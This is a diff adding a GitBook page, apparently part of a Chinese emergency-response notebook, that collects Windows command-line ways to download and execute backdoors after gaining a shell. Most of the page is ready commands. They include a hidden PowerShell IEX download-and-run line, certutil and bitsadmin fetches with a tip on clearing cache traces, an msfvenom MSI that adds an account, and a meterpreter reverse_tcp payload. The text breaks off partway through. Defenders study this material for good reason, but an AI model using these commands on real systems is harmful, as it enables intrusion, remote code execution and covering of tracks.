@@ -1,0 +1,1084 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>第5篇：Windows命令行文件下载方式汇总 · 应急响应实战笔记</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Bypass">
+        
+        
+    
+    <link rel="stylesheet" href="../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="第6篇：三大渗透测试框架权限维持技术.html" />
+    
+    
+    <link rel="prev" href="第4篇：Linux权限维持--后门篇.html" />
+    
+
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"buttons":[{"user":"Bypass007","repo":"Emergency-Response-Notes","type":"star","size":"small","count":true}]};
+    </script>
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../Summary/">
+            
+                <a href="../Summary/">
+            
+                    
+                    第一章：应急响应
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../Summary/第1篇：Window入侵排查.html">
+            
+                <a href="../Summary/第1篇：Window入侵排查.html">
+            
+                    
+                    第1篇：Window入侵排查
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../Summary/第2篇：Linux入侵排查.html">
+            
+                <a href="../Summary/第2篇：Linux入侵排查.html">
+            
+                    
+                    第2篇：Linux入侵排查
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../Summary/第3篇：常见的Webshell查杀工具.html">
+            
+                <a href="../Summary/第3篇：常见的Webshell查杀工具.html">
+            
+                    
+                    第3篇：常见的Webshell查杀工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../Summary/第4篇：如何发现隐藏的Webshell后门.html">
+            
+                <a href="../Summary/第4篇：如何发现隐藏的Webshell后门.html">
+            
+                    
+                    第4篇：如何发现隐藏的Webshell后门
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../Summary/第5篇：勒索病毒自救指南.html">
+            
+                <a href="../Summary/第5篇：勒索病毒自救指南.html">
+            
+                    
+                    第5篇：勒索病毒自救指南
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../LogAnalysis/">
+            
+                <a href="../LogAnalysis/">
+            
+                    
+                    第二章：日志分析
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../LogAnalysis/第1篇：Window日志分析.html">
+            
+                <a href="../LogAnalysis/第1篇：Window日志分析.html">
+            
+                    
+                    第1篇:Window日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../LogAnalysis/第2篇：Linux日志分析.html">
+            
+                <a href="../LogAnalysis/第2篇：Linux日志分析.html">
+            
+                    
+                    第2篇:Linux日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../LogAnalysis/第3篇：Web日志分析.html">
+            
+                <a href="../LogAnalysis/第3篇：Web日志分析.html">
+            
+                    
+                    第3篇:Web日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../LogAnalysis/第4篇：MSSQL日志分析.html">
+            
+                <a href="../LogAnalysis/第4篇：MSSQL日志分析.html">
+            
+                    
+                    第4篇:MSSQL日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../LogAnalysis/第5篇：MySQL日志分析.html">
+            
+                <a href="../LogAnalysis/第5篇：MySQL日志分析.html">
+            
+                    
+                    第5篇:MySQL日志分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    第三章：权限维持篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="第1篇：Windows权限维持--隐藏篇.html">
+            
+                <a href="第1篇：Windows权限维持--隐藏篇.html">
+            
+                    
+                    第1篇：Windows权限维持--隐藏篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="第2篇：Windows权限维持--后门篇.html">
+            
+                <a href="第2篇：Windows权限维持--后门篇.html">
+            
+                    
+                    第2篇：Windows权限维持--后门篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="第3篇：Linux权限维持--隐藏篇.html">
+            
+                <a href="第3篇：Linux权限维持--隐藏篇.html">
+            
+                    
+                    第3篇：Linux权限维持--隐藏篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="第4篇：Linux权限维持--后门篇.html">
+            
+                <a href="第4篇：Linux权限维持--后门篇.html">
+            
+                    
+                    第4篇：Linux权限维持--后门篇
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.4.5" data-path="第5篇：Windows命令行文件下载方式汇总.html">
+            
+                <a href="第5篇：Windows命令行文件下载方式汇总.html">
+            
+                    
+                    第5篇：Windows命令行文件下载方式汇总
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.6" data-path="第6篇：三大渗透测试框架权限维持技术.html">
+            
+                <a href="第6篇：三大渗透测试框架权限维持技术.html">
+            
+                    
+                    第6篇：三大渗透测试框架权限维持技术
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.7" data-path="第7篇：常见WebShell管理工具.html">
+            
+                <a href="第7篇：常见WebShell管理工具.html">
+            
+                    
+                    第7篇：常见WebShell管理工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../Windows/">
+            
+                <a href="../Windows/">
+            
+                    
+                    第四章：Windows实战篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../Windows/第1篇：FTP暴力破解.html">
+            
+                <a href="../Windows/第1篇：FTP暴力破解.html">
+            
+                    
+                    第1篇：FTP暴力破解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../Windows/第2篇：蠕虫病毒.html">
+            
+                <a href="../Windows/第2篇：蠕虫病毒.html">
+            
+                    
+                    第2篇：蠕虫病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../Windows/第3篇：勒索病毒.html">
+            
+                <a href="../Windows/第3篇：勒索病毒.html">
+            
+                    
+                    第3篇：勒索病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../Windows/第4篇：ARP病毒.html">
+            
+                <a href="../Windows/第4篇：ARP病毒.html">
+            
+                    
+                    第4篇：ARP病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../Windows/第5篇：挖矿病毒（一）.html">
+            
+                <a href="../Windows/第5篇：挖矿病毒（一）.html">
+            
+                    
+                    第5篇：挖矿病毒（一）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../Windows/第6篇：挖矿病毒（二）.html">
+            
+                <a href="../Windows/第6篇：挖矿病毒（二）.html">
+            
+                    
+                    第6篇：挖矿病毒（二）
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="../Linux/">
+            
+                <a href="../Linux/">
+            
+                    
+                    第五章：Linux实战篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="../Linux/第1篇：SSH暴力破解.html">
+            
+                <a href="../Linux/第1篇：SSH暴力破解.html">
+            
+                    
+                    第1篇：SSH暴力破解
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="../Linux/第2篇：捕捉短连接.html">
+            
+                <a href="../Linux/第2篇：捕捉短连接.html">
+            
+                    
+                    第2篇：捕捉短连接
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../Linux/第3篇：挖矿病毒.html">
+            
+                <a href="../Linux/第3篇：挖矿病毒.html">
+            
+                    
+                    第3篇：挖矿病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="../Linux/第4篇：盖茨木马.html">
+            
+                <a href="../Linux/第4篇：盖茨木马.html">
+            
+                    
+                    第4篇：盖茨木马
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.5" data-path="../Linux/第5篇：DDOS病毒.html">
+            
+                <a href="../Linux/第5篇：DDOS病毒.html">
+            
+                    
+                    第5篇：DDOS病毒
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="../Web/">
+            
+                <a href="../Web/">
+            
+                    
+                    第六章：Web实战篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="../Web/第1篇：网站被植入Webshell.html">
+            
+                <a href="../Web/第1篇：网站被植入Webshell.html">
+            
+                    
+                    第1篇：网站被植入Webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="../Web/第2篇：门罗币恶意挖矿.html">
+            
+                <a href="../Web/第2篇：门罗币恶意挖矿.html">
+            
+                    
+                    第2篇：门罗币恶意挖矿
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="../Web/第3篇：批量挂黑页.html">
+            
+                <a href="../Web/第3篇：批量挂黑页.html">
+            
+                    
+                    第3篇：批量挂黑页
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="../Web/第4篇：新闻源网站劫持.html">
+            
+                <a href="../Web/第4篇：新闻源网站劫持.html">
+            
+                    
+                    第4篇：新闻源网站劫持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.5" data-path="../Web/第5篇：移动端劫持.html">
+            
+                <a href="../Web/第5篇：移动端劫持.html">
+            
+                    
+                    第5篇：移动端劫持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.6" data-path="../Web/第6篇：搜索引擎劫持.html">
+            
+                <a href="../Web/第6篇：搜索引擎劫持.html">
+            
+                    
+                    第6篇：搜索引擎劫持
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.7" data-path="../Web/第7篇：网站首页被篡改.html">
+            
+                <a href="../Web/第7篇：网站首页被篡改.html">
+            
+                    
+                    第7篇：网站首页被篡改
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.8" data-path="../Web/第8篇：管理员账号被篡改.html">
+            
+                <a href="../Web/第8篇：管理员账号被篡改.html">
+            
+                    
+                    第8篇：管理员账号被篡改
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.9" data-path="../Web/第9篇：编辑器入侵事件.html">
+            
+                <a href="../Web/第9篇：编辑器入侵事件.html">
+            
+                    
+                    第9篇：编辑器入侵事件
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href=".." >第5篇：Windows命令行文件下载方式汇总</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="&#x7B2C;5&#x7BC7;&#xFF1A;windows&#x547D;&#x4EE4;&#x884C;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x65B9;&#x5F0F;&#x6C47;&#x603B;">&#x7B2C;5&#x7BC7;&#xFF1A;Windows&#x547D;&#x4EE4;&#x884C;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x65B9;&#x5F0F;&#x6C47;&#x603B;</h2>
+<p>&#x5F53;&#x6211;&#x4EEC;&#x901A;&#x8FC7;Web&#x6E17;&#x900F;&#x83B7;&#x53D6;&#x4E86;&#x4E00;&#x4E2A;Shell&#xFF0C;&#x800C;&#x4E14;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x662F;Windows&#xFF0C;&#x6211;&#x4EEC;&#x8BE5;&#x600E;&#x4E48;&#x53BB;&#x4E0B;&#x8F7D;&#x540E;&#x95E8;&#x6587;&#x4EF6;&#x5230;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x4E0A;&#x6267;&#x884C;&#x5462;&#xFF1F;</p>
+<p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x5B9E;&#x73B0;Windows&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x4E0D;&#x5916;&#x4E4E;&#x4EE5;&#x4E0B;&#x51E0;&#x79CD;&#x65B9;&#x5F0F;&#x3002;&#x7B2C;&#x4E00;&#x79CD;&#xFF0C;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x6267;&#x884C;&#xFF1B;<strong>&#x7B2C;&#x4E8C;&#x79CD;&#xFF0C;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x6267;&#x884C;&#xFF0C;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x6CA1;&#x6709;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x843D;&#x5730;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x5DF2;&#x7136;&#x6210;&#x4E3A;&#x540E;&#x95E8;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x6267;&#x884C;&#x7684;&#x9996;&#x8981;&#x65B9;&#x5F0F;**</strong>&#x3002;**&#x53E6;&#x5916;&#x5462;&#xFF0C;&#x53EA;&#x8981;&#x4F60;&#x6240;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7684;&#x73AF;&#x5883;&#x652F;&#x6301;&#xFF0C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4EFB;&#x4F55;&#x4E00;&#x95E8;&#x8BED;&#x8A00;&#x6765;&#x5B9E;&#x73B0;&#x5B83;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x6682;&#x4E0D;&#x5728;&#x672C;&#x6587;&#x7684;&#x8BA8;&#x8BBA;&#x8303;&#x56F4;&#x4E4B;&#x5185;&#x3002;</p>
+<p><strong>&#x5728;&#x8FD9;&#x91CC;&#xFF0C;**</strong>&#x672C;&#x6587;&#x6536;&#x96C6;&#x4E86;15&#x79CD;&#x5E38;&#x89C1;&#x7684;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x5E76;&#x7ED3;&#x5408;&#x5177;&#x4F53;&#x6848;&#x4F8B;**&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x4E00;&#x8D77;&#x6765;&#x770B;&#x770B;&#x662F;&#x600E;&#x4E48;&#x5B9E;&#x73B0;&#x7684;&#x5427;&#x3002;</p>
+<hr>
+<ul>
+<li>PowerShell</li>
+<li>Bitsadmin</li>
+<li>certutil</li>
+<li>wget</li>
+<li>ipc$&#x6587;&#x4EF6;&#x5171;&#x4EAB;</li>
+<li>FTP</li>
+<li>TFTP</li>
+<li>WinScp</li>
+<li>msiexec</li>
+<li>IEExec</li>
+<li>mshta</li>
+<li>rundll32</li>
+<li>regsvr32 </li>
+<li>MSXSL.EXE</li>
+<li>pubprn.vbs</li>
+</ul>
+<hr>
+<p><strong>1&#x3001;PowerShell</strong></p>
+<p>PowerShell&#x662F;&#x4E00;&#x79CD;&#x547D;&#x4EE4;&#x884C;&#x5916;&#x58F3;&#x7A0B;&#x5E8F;&#x548C;&#x811A;&#x672C;&#x73AF;&#x5883;&#xFF0C;&#x4F7F;&#x547D;&#x4EE4;&#x884C;&#x7528;&#x6237;&#x548C;&#x811A;&#x672C;&#x7F16;&#x5199;&#x8005;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x3002;</p>
+<p>&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x5730;&#xFF1A;</p>
+<pre><code>powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.28.128/imag/evil.txt&apos;,&apos;evil.exe&apos;)
+</code></pre><p>&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF1A;</p>
+<pre><code>powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.28.128/imag/evil.txt&apos;))&quot;
+</code></pre><p><img src="image/20200413-1.png" alt=""></p>
+<p><strong>2&#x3001;Bitsadmin</strong></p>
+<p>bitsadmin&#x662F;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x4E0B;&#x8F7D;&#x6216;&#x4E0A;&#x4F20;&#x5DE5;&#x4F5C;&#x548C;&#x76D1;&#x6D4B;&#x5176;&#x8FDB;&#x5C55;&#x60C5;&#x51B5;&#x3002;</p>
+<pre><code>bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt
+</code></pre><p>&#x8F93;&#x5165;&#x4EE5;&#x4E0A;&#x547D;&#x4EE4;&#xFF0C;&#x6210;&#x529F;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x3002;</p>
+<p><img src="image/20200413-2.png" alt=""></p>
+<p><strong>3&#x3001;certutil</strong></p>
+<p>&#x7528;&#x4E8E;&#x5907;&#x4EFD;&#x8BC1;&#x4E66;&#x670D;&#x52A1;&#xFF0C;&#x652F;&#x6301;xp-win10&#x90FD;&#x652F;&#x6301;&#x3002;&#x7531;&#x4E8E;certutil&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x7559;&#x4E0B;&#x7F13;&#x5B58;&#xFF0C;&#x6240;&#x4EE5;&#x4E00;&#x822C;&#x90FD;&#x5EFA;&#x8BAE;&#x4E0B;&#x8F7D;&#x5B8C;&#x6587;&#x4EF6;&#x540E;&#x5BF9;&#x7F13;&#x5B58;&#x8FDB;&#x884C;&#x5220;&#x9664;&#x3002;</p>
+<p>&#x6CE8;&#xFF1A;&#x7F13;&#x5B58;&#x76EE;&#x5F55;&#x4E3A;&#xFF1A;&quot;%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content&quot;</p>
+<pre><code>#&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
+#&#x5220;&#x9664;&#x7F13;&#x5B58;
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
+</code></pre><p><img src="image/20200413-3.png" alt=""></p>
+<p><strong>4&#x3001;wget</strong></p>
+<p>Windows&#x73AF;&#x5883;&#x4E0B;&#xFF0C;&#x53EF;&#x4E0A;&#x4F20;&#x514D;&#x5B89;&#x88C5;&#x7684;&#x53EF;&#x6267;&#x884C;&#x7A0B;&#x5E8F;wget.exe&#x5230;&#x76EE;&#x6807;&#x673A;&#x5668;&#xFF0C;&#x4F7F;&#x7528;wget&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x3002;</p>
+<p>wget.exe&#x4E0B;&#x8F7D;&#xFF1A;<a href="https://eternallybored.org/misc/wget/" target="_blank">https://eternallybored.org/misc/wget/</a></p>
+<pre><code>wget -O &quot;evil.txt&quot; http://192.168.28.128/imag/evil.txt
+</code></pre><p><img src="image/20200413-4.png" alt=""></p>
+<p><strong>5&#x3001;ipc$&#x6587;&#x4EF6;&#x5171;&#x4EAB;</strong></p>
+<p>IPC$(Internet Process Connection)&#x662F;&#x5171;&#x4EAB;&quot;&#x547D;&#x540D;&#x7BA1;&#x9053;&quot;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x5B83;&#x662F;&#x4E3A;&#x4E86;&#x8BA9;&#x8FDB;&#x7A0B;&#x95F4;&#x901A;&#x4FE1;&#x800C;&#x5F00;&#x653E;&#x7684;&#x547D;&#x540D;&#x7BA1;&#x9053;&#xFF0C;&#x901A;&#x8FC7;&#x63D0;&#x4F9B;&#x53EF;&#x4FE1;&#x4EFB;&#x7684;&#x7528;&#x6237;&#x540D;&#x548C;&#x53E3;&#x4EE4;&#xFF0C;&#x8FDE;&#x63A5;&#x53CC;&#x65B9;&#x53EF;&#x4EE5;&#x5EFA;&#x7ACB;&#x5B89;&#x5168;&#x7684;&#x901A;&#x9053;&#x5E76;&#x4EE5;&#x6B64;&#x901A;&#x9053;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x6570;&#x636E;&#x7684;&#x4EA4;&#x6362;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x5BF9;&#x8FDC;&#x7A0B;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x8BBF;&#x95EE;&#x3002;</p>
+<pre><code>#&#x5EFA;&#x7ACB;&#x8FDC;&#x7A0B;IPC&#x8FDE;&#x63A5;
+net use \\192.168.28.128\ipc$ /user:administrator &quot;abc123!&quot;
+#&#x590D;&#x5236;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x5230;&#x672C;&#x5730;&#x4E3B;&#x673A;
+copy \\192.168.28.128\c$\2.txt D:\test
+</code></pre><p><img src="image/20200413-5.png" alt=""></p>
+<p><strong>6&#x3001;FTP </strong></p>
+<p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x653B;&#x51FB;&#x8005;&#x4F7F;&#x7528;FTP&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x5F88;&#x591A;&#x4EA4;&#x4E92;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A; bash&#x811A;&#x672C;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x4E86;&#x4EA4;&#x4E92;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x5E76;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4EA4;&#x4E92;&#x52A8;&#x4F5C;&#x3002;</p>
+<pre><code>ftp 127.0.0.1
+username
+password
+get file
+exit
+</code></pre><p><img src="image/20200413-6.png" alt=""></p>
+<p><strong>7&#x3001;TFTP</strong></p>
+<p>&#x7528;&#x6765;&#x4E0B;&#x8F7D;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x7B80;&#x5355;&#x7684;&#x7F51;&#x7EDC;&#x534F;&#x8BAE;&#xFF0C;&#x5B83;&#x57FA;&#x4E8E;UDP&#x534F;&#x8BAE;&#x800C;&#x5B9E;&#x73B0;</p>
+<p>tftp32&#x670D;&#x52A1;&#x7AEF;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<a href="http://tftpd32.jounin.net/tftpd32_download.html" target="_blank">http://tftpd32.jounin.net/tftpd32_download.html</a></p>
+<pre><code>tftp -i &#x4F60;&#x7684;IP get &#x8981;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6; &#x5B58;&#x653E;&#x4F4D;&#x7F6E;
+</code></pre><p><img src="image/20200413-7.png" alt=""></p>
+<p><strong>8&#x3001;WinScp</strong></p>
+<p>WinSCP&#x662F;&#x4E00;&#x4E2A;Windows&#x73AF;&#x5883;&#x4E0B;&#x4F7F;&#x7528;SSH&#x7684;&#x5F00;&#x6E90;&#x56FE;&#x5F62;&#x5316;SFTP&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p>
+<pre><code>#&#x4E0A;&#x4F20;
+winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt  /tmp/&quot; &quot;exit&quot; /log=log_file.txt 
+
+#&#x4E0B;&#x8F7D;
+winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.tx
+</code></pre><p>&#x4F7F;&#x7528;winscp.exe &#x4F5C;&#x4E3A;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x6267;&#x884C;&#x8FDC;&#x7A0B;&#x4E0A;&#x4F20;/&#x4E0B;&#x8F7D;&#x64CD;&#x4F5C;&#x3002;</p>
+<p><img src="image/20200413-8.png" alt=""></p>
+<p><strong>9&#x3001;msiexec</strong></p>
+<p>msiexec &#x652F;&#x6301;&#x8FDC;&#x7A0B;&#x4E0B;&#x8F7D;&#x529F;&#x80FD;&#xFF0C;&#x5C06;msi&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#xFF1A;</p>
+<pre><code>#&#x751F;&#x6210;msi&#x5305;
+msfvenom -p windows/exec CMD=&apos;net user test abc123! /add&apos; -f msi &gt; evil.msi
+#&#x8FDC;&#x7A0B;&#x6267;&#x884C;
+msiexec /q /i http://192.168.28.128/evil.msi
+</code></pre><p>&#x6210;&#x529F;&#x6DFB;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;test&#x7528;&#x6237;&#xFF1A;</p>
+<p><img src="image/20200413-9.png" alt=""></p>
+<p><strong>10&#x3001;IEExec</strong></p>
+<p>IEexec.exe&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x662F;.NET Framework&#x9644;&#x5E26;&#x7A0B;&#x5E8F;&#xFF0C;&#x5B58;&#x5728;&#x4E8E;&#x591A;&#x4E2A;&#x7CFB;&#x7EDF;&#x767D;&#x540D;&#x5355;&#x5185;&#x3002;</p>
+<p>&#x751F;&#x6210;Payload&#xFF1A;</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe
+</code></pre><p>&#x4F7F;&#x7528;&#x7BA1;&#x7406;&#x5458;&#x8EAB;&#x4EFD;&#x6253;&#x5F00;cmd&#xFF0C;&#x5206;&#x522B;&#x8FD0;&#x884C;&#x4E0B;&#x9762;&#x4E24;&#x6761;&#x547D;&#x4EE4;&#x3002;</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
